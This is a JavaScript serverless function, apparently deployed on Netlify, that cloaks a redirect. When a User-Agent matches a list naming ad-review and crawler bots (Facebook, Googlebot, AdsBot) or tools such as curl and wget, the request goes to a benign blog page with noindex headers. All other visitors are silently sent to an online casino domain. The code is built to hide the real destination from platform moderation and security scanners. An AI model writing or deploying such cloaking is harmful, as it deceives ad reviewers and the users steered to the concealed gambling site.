const BOT_REDIRECTS = {
  default: {
    url: 'https://www.gamixlabs.com/blog.html',
    status: 302,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      Pragma: 'no-cache',
      Expires: '0',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  },
};

function detectBotType(userAgent) {
  if (!userAgent) return null;
  userAgent = userAgent.toLowerCase();

  const botKeywords = [
    'facebook', 'meta', 'googlebot', 'adsbot', 'twitterbot', 'slackbot', 'discordbot',
    'curl', 'wget', 'bot', 'crawl', 'spider', 'preview', 'fetch', 'axios', 'httpclient',
  ];
  if (botKeywords.some(k => userAgent.includes(k))) return 'default';

  return null;
}

exports.handler = async (event) => {
  const userAgent = event.headers['user-agent'] || '';
  const host = event.headers['host'] || '';

  if (host === 'yalanyok.netlify.app') {
    const botType = detectBotType(userAgent);

    if (botType) {
      const redirectConfig = BOT_REDIRECTS[botType] || BOT_REDIRECTS.default;
      return {
        statusCode: redirectConfig.status,
        headers: {
          Location: redirectConfig.url,
          ...redirectConfig.headers,
        },
      };
    } else {
      // Реальный пользователь — на основной домен
      return {
        statusCode: 302,
        headers: {
          Location: 'https://galaxy-casino.live',
        },
      };
    }
  }

  // На других доменах отдаём 200 (сайт работает)
  return {
    statusCode: 200,
    body: '',
  };
};
